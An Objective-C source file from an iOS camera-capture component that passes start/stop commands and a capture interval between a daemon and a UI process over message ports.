//
//  CameraCaptureManageDUtils.m
//  CameraCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 6/20/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "CameraCaptureManagerDUtils.h"
#import "CameraCaptureManager.h"
#import "MessagePortIPCSender.h"
#import "MessagePortIPCReader.h"
#import "DefStd.h"
#import "DebugStatus.h"
#import "CameraCaptureCenter.h"

@interface CameraCaptureManagerDUtils (private)

// Sender part
- (BOOL) sendData: (NSData *) aData toPort: (NSString *) aPortName;
- (BOOL) sendData: (NSData *) aData;
// Receiver part
- (void) startMessagePort;
- (void) stopMessagePort;
@end

@implementation CameraCaptureManagerDUtils

@synthesize mCameraCaptureManager;

@synthesize mDelegate;
@synthesize mCameraCaptureSelector;

- (id) initWithCameraCaptureManager: (CameraCaptureManager *) aCameraCaptureManager {
	if ((self = [super init])) {
		[self setMCameraCaptureManager:aCameraCaptureManager];
		[self startMessagePort];	// wait from command from a daemon
	}
	
	return (self);
}

#pragma mark -
#pragma mark Sender part

- (void) commandToUI: (CameraCaptureManagerCmd) aCommand interval: (NSInteger) aInterval {
	if (aCommand == kCCMStart) {
		[[mCameraCaptureManager mCCC] startMessagePort];
	} else if (aCommand == kCCMStop) {
		[[mCameraCaptureManager mCCC] stopMessagePort];
	}
	/*
	 Format of the constrcted data
	 | CameraCaptureManagerCmd (NSInteger) |
	 */
	NSMutableData* data = [[NSMutableData alloc] init];
	[data appendBytes:&aCommand length:sizeof(NSInteger)];
	[data appendBytes:&aInterval length:sizeof(NSInteger)];
	
	[self sendData:data];
}

- (BOOL) sendData: (NSData *) aData {
	BOOL success = NO;
	if (!(success = [self sendData:aData toPort:kPanicImageDaemonSenderMessagePort])) {
		//DLog(@"!!!!!!!!!!!!!!!!!!!! send command to the UI")
	}
	return success;
}

- (BOOL) sendData: (NSData *) aData toPort: (NSString *) aPortName {
	BOOL success = NO;
	// Commnad the UI to start/stop
	MessagePortIPCSender *mMessagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	success = [mMessagePortSender writeDataToPort:aData];
	[mMessagePortSender release];
	mMessagePortSender = nil;
	return success;
}


#pragma mark -
#pragma mark Receiver part


- (void) startMessagePort {
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kPanicImageUISenderMessagePort	// received from 'command' port
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
}

- (void) stopMessagePort {
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}
}

/**
 - Method name:						dataDidReceivedFromSocket
 - Purpose:							Callback function when data is received via message port
 - Argument list and description:	aRawData, the received data
 - Return description:				No return type
 */
- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	/*
	 Format of the constrcted data
	 | CameraCaptureManagerCmd (NSInteger) |
	 */	
	CameraCaptureManagerCmd command = kCCMStop;
	NSInteger interval = 0;
	[aRawData getBytes:&command length:sizeof(NSInteger)];
	[aRawData getBytes:&interval range:NSMakeRange(sizeof(NSInteger), sizeof(NSInteger))];
	DLog (@"Daemon ==== Camera Cmd = %d, interval = %d", command, interval)
	NSNumber *start = nil;
	if (command == kCCMStart) {
		[mCameraCaptureManager setMUICapturingInterval:interval]; // Just to remember
		[[mCameraCaptureManager mCCC] startMessagePort];
		start = [NSNumber numberWithInt:YES];
	} else if (command == kCCMStop) {
		[[mCameraCaptureManager mCCC] stopMessagePort];
		start = [NSNumber numberWithInt:NO];
	}
	
	if ([[self mDelegate] respondsToSelector:[self mCameraCaptureSelector]]) {
		[[self mDelegate] performSelector:[self mCameraCaptureSelector] withObject:start];
	}
}

- (void) dealloc {
	[self stopMessagePort];
	[super dealloc];
}

@end
